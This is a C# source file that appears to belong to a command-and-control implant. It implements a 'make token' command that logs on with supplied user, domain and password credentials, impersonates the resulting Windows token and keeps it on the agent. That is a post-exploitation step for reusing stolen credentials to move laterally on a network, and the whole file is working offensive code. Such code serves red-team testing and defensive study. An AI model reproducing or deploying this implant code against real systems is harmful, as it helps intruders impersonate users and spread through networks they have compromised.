using Agent.Commands;
using Agent.Helpers;
using Agent.Models;
using System;
using System.Security.Principal;
using System.Threading.Tasks;
using System.Threading;
using WinAPI.Data.AdvApi;
using WinAPI.PInvoke;
using Shared;

namespace Commands
{
    public class MakeTokenCommand : AgentCommand
    {
        public override CommandId Command => CommandId.MakeToken;
        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
        {
            task.ThrowIfParameterMissing(ParameterId.User);
            task.ThrowIfParameterMissing(ParameterId.Password);
            task.ThrowIfParameterMissing(ParameterId.Domain);

            var domain = task.GetParameter<string>(ParameterId.Domain);
            var password = task.GetParameter<string>(ParameterId.Password);
            var username = task.GetParameter<string>(ParameterId.User);

            IntPtr hToken = IntPtr.Zero;
            if (Advapi.LogonUserA(username, domain, password, LogonProvider.LOGON32_LOGON_NEW_CREDENTIALS, LogonUserProvider.LOGON32_PROVIDER_DEFAULT, ref hToken))
            {
                if (Advapi.ImpersonateLoggedOnUser(hToken))
                {
                    var identity = new WindowsIdentity(hToken);
                    context.AppendResult($"Successfully impersonated {identity.Name}");
                    context.Agent.ImpersonationToken = hToken;
                    return;
                }

                context.Error($"Successfully made token but failed to impersonate");
                return;
            }

            context.Error($"Failed to make token");
            return;
        }
    }
}
